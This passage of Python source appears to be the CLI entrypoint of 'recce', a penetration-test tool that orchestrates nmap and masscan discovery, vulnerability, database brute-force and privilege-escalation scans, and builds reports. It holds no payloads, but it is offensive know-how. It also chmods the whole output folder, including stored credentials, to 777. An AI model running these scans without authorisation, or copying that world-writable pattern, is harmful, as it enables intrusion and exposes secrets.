"""Command-line entrypoint for recce.

Subcommands (see `recce -h` for the full, authoritative list):
  Scan/enumerate  enum, scan, vulns, db, privesc, credenum, services
  Import/ingest   import (nmap -oX/-oG/-oN), ingest (on-target loot)
  Post-exploit    exploitplan, attackpath, creds, deploy (mass local-enum)
  Report/track    report, status, review, writeups, writeup
  Utility         demo (bundled sample, no network), doctor (self-test)
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
import tempfile
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from . import ad
from . import exploits
from . import parser as np
from . import scanner
from . import tracking as tr
from .models import Host
from .report_excel import read_workbook_edits, update_workbook
from .report_markdown import build_csv, build_markdown
from .store import Store, StoreError
from .targets import apply_exclusions, ip_matcher, load_targets

BANNER = r"""
  ____  _____ ____ ____ _____
 |  _ \| ____/ ___/ ___| ____|
 | |_) |  _|| |  | |   |  _|
 |  _ <| |__| |__| |___| |___
 |_| \_\_____\____\____|_____|
   recon & coverage tracker for airgapped pentests
"""



def _fmt_dur(seconds: float) -> str:
    """Compact human duration: 45s / 3m20s / 1h04m."""
    s = int(round(seconds))
    if s < 60:
        return f"{s}s"
    if s < 3600:
        return f"{s // 60}m{s % 60:02d}s"
    return f"{s // 3600}h{(s % 3600) // 60:02d}m"


def _progress(done: int, total: int, start: float) -> str:
    """A '· 42% · ETA 3m20s' suffix from elapsed time and completion ratio."""
    if total <= 0:
        return ""
    pct = int(done * 100 / total)
    elapsed = time.monotonic() - start
    if done and done < total:
        eta = elapsed / done * (total - done)
        return f" · {pct}% · ETA {_fmt_dur(eta)}"
    if done >= total:
        return f" · 100% · {_fmt_dur(elapsed)} total"
    return f" · {pct}%"


def _summarize_failures(phase: str, errs: list, total: int) -> None:
    """Loud end-of-phase failure summary so a bad host can't scroll past unseen.
    `errs` is a list of (ip, message); prints nothing when everything went fine."""
    if not errs:
        print(f"[+] {phase}: {total}/{total} host(s) OK, no errors.")
        return
    hosts = len({ip for ip, _ in errs})
    print("\n" + "!" * 64)
    print(f"[x] {phase}: {hosts} host(s) had errors ({len(errs)} issue(s)) - "
          f"{total - hosts}/{total} clean:")
    for ip, msg in errs:
        print(f"      {ip:<16} {msg}")
    print("!" * 64)


def _ports_for_host(xml_path: str, ip: str) -> list[int]:
    for h in np.parse_nmap_xml(xml_path):
        if h.ip == ip:
            return [p.portid for p in h.ports]
    return []


def _open_store(db_path: str):
    """Open the datastore, turning a corrupt/unreadable DB (StoreError) into a
    clean actionable message + None instead of a traceback. Used by the commands
    that open an existing engagement directly (report/status/writeups/...)."""
    try:
        return Store(db_path)
    except StoreError as e:
        print(f"[x] {e}")
        return None


def _relax_perms(path: str, mode: int = 0o777) -> None:
    """Best-effort chmod of the engagement tree to `mode` (default 777).

    recce is frequently run under sudo (raw socket scans, reading protected files),
    which leaves root-owned output a normal user can't reopen or edit afterward.
    We relax the whole output folder - every subdir and file - so the operator
    keeps full access regardless of how recce was invoked. Best-effort: a file
    owned by another user (that we can't chmod) is skipped, never fatal."""
    if not path or not os.path.isdir(path):
        return
    targets = [path]
    for root, dirs, files in os.walk(path):
        targets.extend(os.path.join(root, n) for n in dirs)
        targets.extend(os.path.join(root, n) for n in files)
    for t in targets:
        try:
            os.chmod(t, mode)
        except OSError:
            pass


def _open_paths(out_dir: str) -> dict[str, str]:
    raw = os.path.join(out_dir, "raw")
    os.makedirs(raw, exist_ok=True)
    # Keep the engagement folder world-accessible even when recce runs as root, so
    # the operator can always reopen/edit the outputs (see _relax_perms).
    try:
        os.chmod(out_dir, 0o777)
        os.chmod(raw, 0o777)
    except OSError:
        pass
    return {
        "raw": raw,
        "db": os.path.join(out_dir, "results.sqlite"),
        "xlsx": os.path.join(out_dir, "enumeration.xlsx"),
        "md": os.path.join(out_dir, "enumeration.md"),
        "csv": os.path.join(out_dir, "services.csv"),
        "html": os.path.join(out_dir, "report.html"),
        "log": os.path.join(out_dir, "recce.log"),
    }


def _now() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S")


def _record_issues(store: Store, paths: dict, ip: str, issues: list) -> None:
    """Persist scan issues (errors / incomplete scans) to the datastore + the
    plain-text run log, and echo errors to the console so they're seen live."""
    if not issues:
        return
    # Clear this host's prior issues for each phase we're about to (re)write, so a
    # re-run replaces its own issues instead of stacking duplicates.
    for phase in {iss.get("phase", "") for iss in issues if isinstance(iss, dict)}:
        store.clear_issues(ip, phase)
    for iss in issues:
        phase = iss.get("phase", "") if isinstance(iss, dict) else ""
        level = iss.get("level", "warning") if isinstance(iss, dict) else "warning"
        message = iss.get("message", "") if isinstance(iss, dict) else str(iss)
        store.add_issue(ip, phase, level, message, ts=_now())
        try:
            with open(paths["log"], "a") as fh:
                fh.write(f"{_now()} [{level.upper()}] {ip} {message}\n")
        except OSError:
            pass
        marker = "[!]" if level == "error" else "[~]"
        print(f"    {marker} {ip}: {message}")


def _persist_host(store: Store, paths: dict, ip: str, phase: str, host,
                  clear_step: str | None = None) -> bool:
    """Persist one host's results, isolating a datastore failure to that host so
    a single problematic host can never abort the rest of the phase (the store
    already retries locks via busy_timeout; this catches a lock that outlasts it
    or any serialization edge). Returns True if the host was stored."""
    try:
        store.upsert_host(host)
        if clear_step:
            store.delete_tracking(tr.step_key(clear_step, ip))  # re-run clears override
        return True
    except Exception as e:  # noqa: BLE001
        _record_issues(store, paths, ip,
                       [{"phase": phase, "level": "error",
                         "message": f"could not persist results: {e}"}])
        return False


def _resolve_domains(store: Store, hosts: list) -> list:
    domains = {d.name.lower(): d for d in ad.derive_domains(hosts)}
    for d in store.all_domains():
        key = d.name.lower()
        domains[key] = ad.merge_domain(domains[key], d) if key in domains else d
    return list(domains.values())


def _reconcile_steps(store: Store, step_edits: dict) -> None:
    """Turn Checklist step-checkbox values into overrides: record one only when it
    differs from the tool's current auto-completion; otherwise clear it so the box
    follows the tool. (This is what makes 'auto-default, manual wins' work.)"""
    for key, (shown, _note) in step_edits.items():
        try:
            _, step, ip = key.split(":", 2)
        except ValueError:
            continue
        host = store.get_host(ip)
        # A step that no longer applies to the host carries no override.
        if host and not tr.step_applies(host, step):
            store.delete_tracking(key)
            continue
        auto = tr.step_auto(host, step) if host else False
        if shown == auto:
            store.delete_tracking(key)     # follow the tool
        else:
            store.set_reviewed(key, shown)  # persist the manual override


def _import_excel_tracking(store: Store, paths: dict[str, str],
                           reconcile_steps: bool = True) -> None:
    """Pull operator checkbox/notes edits from the workbook into the datastore.

    The datastore is authoritative; call this BEFORE any mutation or regenerate so
    manual edits are captured but never clobbered by a stale rebuild. Step
    checkboxes are reconciled against tool auto-state only in operator-driven
    commands (`reconcile_steps=True`); mid-scan refreshes skip them, because the
    workbook can lag the tool's fresh progress and would look like manual edits."""
    if not os.path.exists(paths["xlsx"]):
        return
    edits, statuses = read_workbook_edits(paths["xlsx"])
    if not edits:
        return
    step_edits = {k: v for k, v in edits.items() if k.startswith("step:")}
    plain: dict = {}
    status_items: dict = {}
    for k, (rev, note) in edits.items():
        if k.startswith("step:"):
            continue
        if k in statuses:
            # Per-port tri-state: persist the status + derived reviewed + notes.
            status_items[k] = (statuses[k], rev, note)
        else:
            plain[k] = (rev, note)
    if plain:
        store.bulk_set_tracking(plain)
    if status_items:
        store.bulk_set_status(status_items)
    if reconcile_steps and step_edits:
        _reconcile_steps(store, step_edits)


def _safe_refresh(store: Store, paths: dict[str, str], title: str) -> bool:
    """Refresh reports mid-scan without losing operator edits.

    Re-imports the operator's saved checkboxes/notes from the workbook FIRST (so
    editing Excel while the scan runs is safe), then regenerates. If the workbook
    is open/locked and can't be written, leaves it and returns False - the edits
    are already captured in the datastore, so nothing is lost.
    """
    _import_excel_tracking(store, paths, reconcile_steps=False)
    try:
        _generate_reports(store, paths, title, quiet=True)
        return True
    except Exception:  # noqa: BLE001
        # A locked workbook (OSError) OR any report-builder bug must NOT abort the
        # scan phase mid-run - the data is safe in the datastore, and the final
        # report (or a later `report` command) will regenerate it.
        return False


def _generate_reports(store: Store, paths: dict[str, str], title: str,
                      quiet: bool = False) -> None:
    """Regenerate all reports from the datastore (the source of truth)."""
    hosts = store.all_hosts()
    tracking = store.get_tracking()
    domains = _resolve_domains(store, hosts)
    meta = {"subtitle": title}
    bh_blob = store.get_meta("ad_bloodhound")
    if bh_blob:
        try:
            meta["ad_bloodhound"] = json.loads(bh_blob)
        except ValueError:
            pass
    mssql_blob = store.get_meta("mssql")
    if mssql_blob:
        try:
            meta["mssql"] = json.loads(mssql_blob)
        except ValueError:
            pass
    smb_blob = store.get_meta("smb")
    if smb_blob:
        try:
            meta["smb"] = json.loads(smb_blob)
        except ValueError:
            pass
    ftp_blob = store.get_meta("ftp")
    if ftp_blob:
        try:
            meta["ftp"] = json.loads(ftp_blob)
        except ValueError:
            pass
    docker_blob = store.get_meta("docker")
    if docker_blob:
        try:
            meta["docker"] = json.loads(docker_blob)
        except ValueError:
            pass
    k8s_blob = store.get_meta("kubernetes")
    if k8s_blob:
        try:
            meta["kubernetes"] = json.loads(k8s_blob)
        except ValueError:
            pass
    update_workbook(paths["xlsx"], hosts, meta=meta,
                    domains=domains, tracking=tracking, scope=store.get_scope(),
                    statuses=store.get_statuses(), issues=store.get_issues(),
                    credentials=store.all_credentials())
    build_markdown(hosts, paths["md"], title=title, domains=domains)
    build_csv(hosts, paths["csv"])
    from .report_html import build_html
    build_html(hosts, paths["html"], title=title, domains=domains,
               credentials=store.all_credentials(), generated=_now())
    if not quiet:
        cov = tr.compute_coverage(hosts, tracking)["overall"]
        print(f"[+] Reports written ({cov['done']}/{cov['total']} items reviewed, "
              f"{cov['pct']}%):\n    {paths['xlsx']}\n    {paths['md']}\n    {paths['csv']}"
              f"\n    {paths['html']}")
        counts = store.count_issues()
        if counts.get("total"):
            print(f"[!] {counts['total']} scan issue(s) logged "
                  f"({counts.get('error', 0)} error, {counts.get('warning', 0)} "
                  f"incomplete) - see the Overview tab or {paths['log']}")


# --- scan command ----------------------------------------------------------------

def _apply_profile_overrides(profile, args) -> None:
    g = lambda name, default=None: getattr(args, name, default)  # noqa: E731
    if g("all_ports"):
        profile.all_ports = True
    if g("top_ports"):
        profile.all_ports = False
        profile.top_ports = args.top_ports
    if g("no_ad"):
        profile.ad_enrich = False
    if g("no_os"):
        profile.os_detect = False
    if g("min_rate"):
        profile.min_rate = args.min_rate
    if g("max_retries") is not None:
        profile.max_retries = args.max_retries
    if g("no_verify"):
        profile.verify = False
    if g("verify_all"):
        profile.verify_all = True
    if g("reliable"):
        profile.reliable = True
    if g("udp_top"):
        profile.udp_top = args.udp_top
    if g("masscan") or g("fast"):
        profile.scanner = "masscan"
    if g("offline"):
        profile.offline = True
    if g("host_timeout") is not None:
        profile.host_timeout = args.host_timeout
    if g("version_all"):
        profile.version_all = True
    if g("version_intensity") is not None:
        profile.version_intensity = args.version_intensity
    profile.ping_discovery = not g("no_discovery", False)
    profile.assume_up = not profile.ping_discovery   # -Pn: fail-fast on dead IPs


def _split_userdomain(username: str, domain: str | None) -> tuple[str, str]:
    """Accept a domain-qualified username and split the domain out, so a tester can
    type the credential however AD hands it to them:
        -u 'CORP\\administrator'        -> user=administrator, domain=CORP
        -u 'corp.local/administrator'   -> user=administrator, domain=corp.local
        -u 'administrator@corp.local'   -> user=administrator, domain=corp.local
    An explicit -d always wins; an embedded domain only fills in when -d was
    omitted (so `-u CORP\\admin -d corp.local` keeps the fuller -d form)."""
    user = username or ""
    dom = domain or ""
    if "\\" in user:
        d, user = user.split("\\", 1)
        dom = dom or d
    elif "/" in user:
        d, user = user.split("/", 1)
        dom = dom or d
    elif "@" in user:
        user, d = user.rsplit("@", 1)
        dom = dom or d
    return user, dom


def _creds_of(args) -> dict | None:
    if not getattr(args, "username", None):
        return None
    user, domain = _split_userdomain(args.username, getattr(args, "domain", None))
    return {"username": user, "password": args.password, "domain": domain}


def _admin_creds_of(args) -> dict | None:
    """The optional privileged/superuser account (domain defaults to -d)."""
    if not getattr(args, "admin_username", None):
        return None
    user, domain = _split_userdomain(
        args.admin_username,
        getattr(args, "admin_domain", None) or getattr(args, "domain", None))
    return {"username": user, "password": args.admin_password, "domain": domain}


class _Refresher:
    """Throttled interim report refresh: regenerate after every N hosts OR at
    least every `interval` seconds, whichever comes first. Results are already
    persisted to SQLite per host, so this only controls how often the *sheet* is
    rebuilt - findings are durable even if a refresh is skipped or the run dies.
    """

    def __init__(self, args, interval: float = 20.0):
        self.every = getattr(args, "refresh_every", 0) or 0
        self.interval = interval
        self.count = 0
        self.last = time.monotonic()

    def tick(self, store, paths, title) -> None:
        self.count += 1
        now = time.monotonic()
        due = (self.every and self.count % self.every == 0) or \
              (now - self.last >= self.interval)
        if not due:
            return
        if _safe_refresh(store, paths, title):
            self.last = now
            print(f"    ~ report refreshed ({self.count} host(s) so far).")
        else:
            print("    ~ report open/locked - kept your edits, will retry.")


def _final_report(store, paths, title) -> None:
    """Always-try final report (guarded); results survive even if the file is
    locked, since they're in the datastore."""
    try:
        _import_excel_tracking(store, paths, reconcile_steps=False)
        _generate_reports(store, paths, title)
    except Exception as e:  # noqa: BLE001
        # Runs in every command's `finally`, so a locked workbook OR any
        # report-builder bug must not turn completed scan work into a crash.
        detail = "open/locked" if isinstance(e, OSError) else f"{type(e).__name__}: {e}"
        print(f"[!] Could not write the workbook ({detail}). Your data is saved "
              "in the datastore - close the file and run `report` to rebuild it.")


# --- phase 1+2a: discovery + light service enumeration --------------------------

def _mkissue(scan_issue, phase: str) -> dict:
    return {"phase": phase, "level": scan_issue.level,
            "message": scan_issue.message}


def _enum_worker(ip, profile, paths, creds, port_map, subnet_map, active_probe=True):
    """Returns (host|None, issues)."""
    issues: list[dict] = []
    truncated = False
    if port_map is not None:
        open_ports = port_map.get(ip, [])
    else:
        fp_xml = os.path.join(paths["raw"], f"{ip}_ports.xml")
        _, iss = scanner.full_port_scan(ip, fp_xml, profile)
        if iss:
            issues.append(_mkissue(iss, "port-sweep"))
            truncated = iss.kind == "host-timeout"
        open_ports = _ports_for_host(fp_xml, ip)
        # Completeness safeguard: a host that came back with ZERO ports may be
        # genuinely empty - or the fast pass dropped every probe. Confirm it with
        # an independent congestion-adaptive re-scan before we trust "no ports"
        # (everything downstream keys off this). Gated so dead -Pn IPs on a clean
        # network aren't all re-scanned: verify discovered-live hosts always, and
        # -Pn hosts only with --verify-all.
        if (not open_ports and profile.verify and not truncated
                and (profile.ping_discovery or profile.verify_all)):
            vx = os.path.join(paths["raw"], f"{ip}_verify.xml")
            _, viss = scanner.verify_port_scan(ip, vx, profile)
            vports = _ports_for_host(vx, ip)
            if viss and viss.kind == "host-timeout":
                truncated = True
            if vports:
                open_ports = vports
                issues.append(_mkissue(scanner.ScanIssue(
                    "warning", f"port-sweep: fast pass found 0 ports but a "
                    f"verification re-scan found {len(vports)} - the first sweep "
                    "under-reported (network likely lossy); used the re-scan"),
                    "port-sweep"))

    enum_xml = os.path.join(paths["raw"], f"{ip}_enum.xml")
    _, iss = scanner.enum_scan(ip, open_ports, enum_xml, profile, creds=creds)
    if iss:
        issues.append(_mkissue(iss, "enum"))
    host = _fold_host(ip, np.parse_nmap_xml(enum_xml), subnet_map)
    host.enumerated = True
    host.incomplete_scan = truncated
    # Recover the services nmap left as unknown/blank: mine its kept fingerprint,
    # fall back to the curated port map, then a stdlib banner grab (active) - so a
    # port like 5040 becomes 'Windows CDPSvc', not a dead 'unknown'.
    from . import svcdetect
    svcdetect.enrich_host(host, active=active_probe)
    # Second opinion: for the handful of ports STILL unnamed, re-run nmap at max
    # version effort (--version-all) aimed at just those - cheap because it's a few
    # ports, and it's authoritative. Gated with the active probes (--no-probes).
    if active_probe:
        leftover = svcdetect.still_unknown_ports(host)
        if leftover:
            rp_xml = os.path.join(paths["raw"], f"{ip}_reprobe.xml")
            _, riss = scanner.reprobe_services(ip, leftover, rp_xml, profile)
            if riss:
                issues.append(_mkissue(riss, "reprobe"))
            svcdetect.apply_reprobe(host, np.parse_nmap_xml(rp_xml))
    ad.identify_roles(host)
    ad.parse_signing_and_ntlm(host)
    from . import vulndb
    vulndb.assess_host_inplace(host)   # offline version->CVE findings, immediately
    return host, issues


def _discover(args, profile, store, paths):
    try:
        hosts, subnet_map = load_targets(args.targets)
    except (ValueError, OSError) as e:
        # Bad CIDR/range (ValueError) or a missing/unreadable @file (OSError) - the
        # literal first thing a tester types. Fail with a clear message, not a crash.
        print(f"[x] Invalid targets: {e}\n    Fix the IP / range / CIDR / @file "
              "and re-run.")
        return None, [], None
    hosts = apply_exclusions(hosts, args.exclude or [])
    if not hosts:
        print("[x] No targets after expansion/exclusion.")
        return None, [], None
    # Record the full scope so the report accounts for every subnet, even those
    # that turn out to have no live hosts.
    sizes: dict[str, int] = {}
    for ip in hosts:
        sizes[subnet_map[ip]] = sizes.get(subnet_map[ip], 0) + 1
    for subnet, size in sizes.items():
        store.set_scope(subnet, size)
    print(f"[+] {len(hosts)} target host(s) across {len(sizes)} subnet(s).")

    fast_mode = getattr(args, "fast", False) or profile.scanner == "masscan"
    port_map = None
    if fast_mode:
        print("[*] Fast mode: network-wide masscan sweep ...")
        sweep_xml = os.path.join(paths["raw"], "masscan_sweep.xml")
        port_map = scanner.masscan_sweep(hosts, sweep_xml, profile)
        if port_map:
            live_ips = sorted(port_map, key=_ip_key)
            print(f"[+] masscan found {len(live_ips)} host(s) with open ports.")
        else:
            print("[!] masscan unavailable/empty; falling back to nmap.")
            port_map, fast_mode = None, False

    if not fast_mode:
        if profile.ping_discovery:
            with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
                tf.write("\n".join(hosts))
                targets_file = tf.name
            disc_xml = os.path.join(paths["raw"], "discovery.xml")
            print("[*] Discovery: host sweep ...")
            _, iss = scanner.discover_hosts(targets_file, disc_xml)
            if iss:
                _record_issues(store, paths, "(discovery)", [_mkissue(iss, "discovery")])
            live_ips = [h.ip for h in np.parse_nmap_xml(disc_xml)]
            os.unlink(targets_file)
            print(f"[+] {len(live_ips)} of {len(hosts)} target(s) responded to discovery.")
            if not live_ips:
                # Zero responses almost always means the network blocks ping/probes,
                # not that nothing is there. Don't hand back an empty engagement -
                # fall back to -Pn (scan every target as up) automatically.
                print("\n" + "!" * 64)
                print("[!] 0 hosts answered host discovery - the network is likely "
                      "blocking ping/probes.")
                print("    Falling back to -Pn (scanning all targets as up) so you "
                      "don't miss firewalled hosts.")
                print(f"    Per-host cap {profile.host_timeout}m + fail-fast keep it "
                      "moving; for a large scope, --fast (masscan) sweeps in seconds.")
                print("!" * 64)
                profile.assume_up = True          # dead IPs get scanned -> fail fast
                live_ips = hosts
            elif len(live_ips) < len(hosts):
                missed = len(hosts) - len(live_ips)
                print(f"    ({missed} didn't answer. If you expect more live hosts, "
                      "re-run with -Pn - firewalled hosts often block ping.)")
        else:
            live_ips = hosts
            print(f"[*] -Pn: skipping discovery, scanning all {len(hosts)} target(s) "
                  "as up.")
            print(f"    Each host is capped at {profile.host_timeout}m (--host-timeout) "
                  "and dead IPs are abandoned fast; --fast (masscan) is quickest on a "
                  "big scope.")

    if getattr(args, "resume", False):
        done = store.scanned_ips()
        live_ips = [ip for ip in live_ips if ip not in done]
        print(f"[+] Resume: {len(live_ips)} host(s) remaining.")
    return subnet_map, live_ips, port_map


def _phase_enum(store, paths, args, profile, subnet_map, live_ips, port_map) -> None:
    creds = _creds_of(args)
    workers = max(1, args.workers)
    # --no-probes disables our active stdlib layer (banner grabs); the free passive
    # layers (servicefp mining + curated port map) still run.
    active_probe = not getattr(args, "no_probes", False)
    print(f"[*] Enumerating {len(live_ips)} host(s) with {workers} worker(s) "
          f"(ports + services) ...")
    completed = 0
    refresher = _Refresher(args)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_enum_worker, ip, profile, paths, creds, port_map,
                             subnet_map, active_probe): ip for ip in live_ips}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "enum", "level": "error",
                                 "message": f"enum crashed: {e}"}])
                continue
            _record_issues(store, paths, ip, issues)
            if host is None:
                continue
            if not _persist_host(store, paths, ip, "enum", host, clear_step="enum"):
                continue   # one host's persist failure never aborts the rest
            completed += 1
            extra = f" - {', '.join(host.roles)}" if host.roles else ""
            print(f"    [{completed}/{len(live_ips)}] {ip}: "
                  f"{len(host.open_ports)} open port(s){extra}")
            refresher.tick(store, paths, args.title)


# --- phase 2b: vulnerability scanning (per open port) ---------------------------

def _merge_vuln_results(host: Host, parsed_list) -> None:
    """Fold vuln-phase results (vulns, accounts, port scripts) into a host."""
    port_index = {(p.protocol, p.portid): p for p in host.ports}
    for ph in parsed_list:
        if ph.ip != host.ip:
            continue
        vseen = {v.key for v in host.vulns}
        host.vulns.extend(v for v in ph.vulns if v.key not in vseen)
        aseen = {(a.source, a.kind, a.name, a.domain, a.rid) for a in host.accounts}
        for a in ph.accounts:
            if (a.source, a.kind, a.name, a.domain, a.rid) not in aseen:
                host.accounts.append(a)
        hs = {s.id for s in host.host_scripts}
        host.host_scripts.extend(s for s in ph.host_scripts if s.id not in hs)
        for np_ in ph.ports:
            op = port_index.get((np_.protocol, np_.portid))
            if op:
                seen = {s.id for s in op.scripts}
                op.scripts.extend(s for s in np_.scripts if s.id not in seen)
                op.product = op.product or np_.product
                op.version = op.version or np_.version


def _vuln_worker(host, portids, profile, paths, creds, aggressive, use_ss,
                 use_probes=True, fast=False):
    """Returns (host, issues)."""
    ip = host.ip
    issues: list[dict] = []
    if portids:
        vx = os.path.join(paths["raw"], f"{ip}_vuln.xml")
        _, iss = scanner.vuln_scan(ip, portids, vx, profile, creds=creds,
                                   aggressive=aggressive, fast=fast)
        if iss:
            issues.append(_mkissue(iss, "vuln-scan"))
        _merge_vuln_results(host, np.parse_nmap_xml(vx))
    if profile.udp_top:
        ux = os.path.join(paths["raw"], f"{ip}_udp.xml")
        _, iss = scanner.udp_scan(ip, ux, profile)
        if iss:
            issues.append(_mkissue(iss, "udp"))
        _merge_vuln_results(host, np.parse_nmap_xml(ux))
    pset = set(portids)
    for p in host.ports:
        if p.portid in pset:
            p.vuln_scanned = True
    ad.identify_roles(host)
    ad.parse_signing_and_ntlm(host)
    # Deep web enum runs BEFORE the CVE mapping so a product/version recovered from
    # a web fingerprint (Jenkins/Confluence/…) gets version->CVE matched too.
    if use_probes:
        from . import web
        web.scan_host(host, active=True)   # headers/TLS + exposures + fingerprint
    from . import vulndb
    vulndb.assess_host_inplace(host)   # offline version->CVE findings
    if use_ss:
        exploits.enrich_hosts([host])
    return host, issues


def _selected_hosts(hosts, args):
    """Filter stored hosts by IP / range / CIDR selection (targets/--host/--subnet)."""
    tokens = ((getattr(args, "targets", None) or [])
              + (getattr(args, "host", None) or [])
              + (getattr(args, "subnet", None) or []))
    match = ip_matcher(tokens)
    return [h for h in hosts if match(h.ip)]


def _vuln_targets(hosts, args):
    """Return [(host, [portids])] after target selection + --only/--unscanned."""
    only = [o.lower() for o in (getattr(args, "only", None) or [])]
    out = []
    for h in _selected_hosts(hosts, args):
        ports = h.open_ports
        if getattr(args, "unscanned", False):
            ports = [p for p in ports if not p.vuln_scanned]
        if only:
            ports = [p for p in ports
                     if any(k in (p.service or "").lower() or k == str(p.portid)
                            for k in only)]
        if ports:
            out.append((h, [p.portid for p in ports]))
    return out


def _phase_vulns(store, paths, args, profile) -> None:
    creds = _creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    fast = getattr(args, "fast", False) and not aggressive
    use_ss = not getattr(args, "no_searchsploit", False) and exploits.available()
    use_probes = not getattr(args, "no_probes", False)
    if not getattr(args, "no_searchsploit", False) and not exploits.available():
        print("[!] searchsploit not found; skipping exploit mapping "
              "(apt install exploitdb).")
    if profile.offline:
        print("[*] Offline: vulners disabled; using local vuln scripts + searchsploit.")
    if aggressive:
        mode = "AGGRESSIVE (intrusive vuln category)"
    elif fast:
        mode = "FAST (top-signal detection scripts only)"
    else:
        mode = "safe (vuln+safe detection only)"
    print(f"[*] Vuln-scan mode: {mode}"
          f"{' + searchsploit' if use_ss else ''}"
          f"{' + web scan (headers/TLS + exposures)' if use_probes else ''}.")

    targets = _vuln_targets(store.all_hosts(), args)
    if not targets:
        print("[!] No open ports match the vuln-scan filters.")
        return
    workers = max(1, args.workers)
    total_ports = sum(len(p) for _, p in targets)
    total = len(targets)
    print(f"[*] Vuln-scanning {total} host(s) / {total_ports} port(s) "
          f"with {workers} worker(s) ...")
    completed = 0
    errs: list[tuple[str, str]] = []   # (ip, message) for a loud end-of-phase summary
    start = time.monotonic()
    refresher = _Refresher(args)
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_vuln_worker, h, ports, profile, paths, creds,
                             aggressive, use_ss, use_probes, fast): h.ip
                   for h, ports in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "vuln-scan", "level": "error",
                                 "message": f"vuln-scan crashed: {e}"}])
                completed += 1
                errs.append((ip, f"crashed: {e}"))
                print(f"    [{completed}/{total}] {ip}: FAILED (crashed)"
                      f"{_progress(completed, total, start)}")
                continue
            _record_issues(store, paths, ip, issues)
            errs.extend((ip, i["message"]) for i in issues
                        if i.get("level") == "error")
            if not _persist_host(store, paths, ip, "vuln-scan", host, clear_step="vuln"):
                completed += 1
                continue
            completed += 1
            bits = []
            if host.vulns:
                bits.append(f"{len(host.vulns)} finding(s)")
            if host.exploits:
                bits.append(f"{len(host.exploits)} exploit(s)")
            b = f" [{', '.join(bits)}]" if bits else ""
            print(f"    [{completed}/{total}] {ip}: vuln-scanned{b}"
                  f"{_progress(completed, total, start)}")
            refresher.tick(store, paths, args.title)
    _summarize_failures("vuln-scan", errs, total)


# --- phase: database enumeration / vuln scan ------------------------------------

def _db_worker(host, portids, profile, paths, creds, aggressive, use_ss):
    """Returns (host, issues)."""
    from . import db as dbmod
    issues: list[dict] = []
    vx = os.path.join(paths["raw"], f"{host.ip}_db.xml")
    _, iss = scanner.nse_scan(host.ip, portids, vx, profile,
                              dbmod.script_selection(aggressive), creds=creds)
    if iss:
        issues.append(_mkissue(iss, "db"))
    _merge_vuln_results(host, np.parse_nmap_xml(vx))
    pset = set(portids)
    for p in host.ports:
        if p.portid in pset:
            p.vuln_scanned = True
    host.db_scanned = True
    if use_ss:
        exploits.enrich_hosts([host])
    return host, issues


def _phase_db(store, paths, args, profile) -> None:
    from . import db as dbmod
    creds = _creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    use_ss = not getattr(args, "no_searchsploit", False) and exploits.available()
    targets = [(h, [p.portid for p in dbmod.db_ports(h)])
               for h in _selected_hosts(store.all_hosts(), args)]
    targets = [(h, ports) for h, ports in targets if ports]
    if not targets:
        print("[!] No database services found in scope.")
        return
    mode = "AGGRESSIVE (brute/xp_cmdshell)" if aggressive else "safe (info + empty-pw)"
    print(f"[*] DB-scanning {len(targets)} host(s) [{mode}] ...")
    refresher = _Refresher(args)
    completed = 0
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futures = {ex.submit(_db_worker, h, ports, profile, paths, creds,
                             aggressive, use_ss): h.ip for h, ports in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "db", "level": "error",
                                 "message": f"db-scan crashed: {e}"}])
                continue
            _record_issues(store, paths, ip, issues)
            if not _persist_host(store, paths, ip, "db", host, clear_step="db"):
                continue
            completed += 1
            print(f"    [{completed}/{len(targets)}] {ip}: db-scanned")
            refresher.tick(store, paths, args.title)


# --- phase: privilege-escalation --------------------------------------------------

def _privesc_worker(host, profile, paths, creds, aggressive):
    """Returns (host, issues)."""
    from . import privesc as pe
    issues: list[dict] = []
    ports = [p.portid for p in host.open_ports
             if p.portid in (139, 445, 3389, 135) or "http" in (p.service or "")]
    if ports:
        vx = os.path.join(paths["raw"], f"{host.ip}_privesc.xml")
        _, iss = scanner.nse_scan(host.ip, ports, vx, profile,
                                  pe.nse_scripts(aggressive), creds=creds)
        if iss:
            issues.append(_mkissue(iss, "privesc"))
        _merge_vuln_results(host, np.parse_nmap_xml(vx))
        ad.identify_roles(host)
        ad.parse_signing_and_ntlm(host)
    return host, issues


def _phase_privesc(store, paths, args, profile) -> None:
    creds = _creds_of(args)
    aggressive = getattr(args, "aggressive", False)
    targets = _selected_hosts(store.all_hosts(), args)
    if not targets:
        print("[!] No hosts in scope.")
        return
    print(f"[*] Priv-esc checks on {len(targets)} host(s) "
          f"[{'aggressive' if aggressive else 'safe'} NSE] ...")
    refresher = _Refresher(args)
    completed = 0
    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as ex:
        futures = {ex.submit(_privesc_worker, h, profile, paths, creds,
                             aggressive): h.ip for h in targets}
        for fut in as_completed(futures):
            ip = futures[fut]
            try:
                host, issues = fut.result()
            except Exception as e:  # noqa: BLE001
                _record_issues(store, paths, ip,
                               [{"phase": "privesc", "level": "error",
                                 "message": f"privesc crashed: {e}"}])
                continue
            _record_issues(store, paths, ip, issues)
            if not _persist_host(store, paths, ip, "privesc", host):
                continue
            completed += 1
            refresher.tick(store, paths, args.title)


# --- phase: credentialed enumeration (netexec / impacket / ssh) ------------------

def _ssh_creds_of(args) -> dict | None:
    user = getattr(args, "ssh_user", None)
    if not user:
        return None
    return {"username": user, "password": getattr(args, "ssh_pass", None),
            "key": getattr(args, "ssh_key", None)}


def _credenum_worker(host, creds, ssh_creds, aggressive, admin_creds=None):
    """Returns (host, issues, auth)."""
    from . import credenum
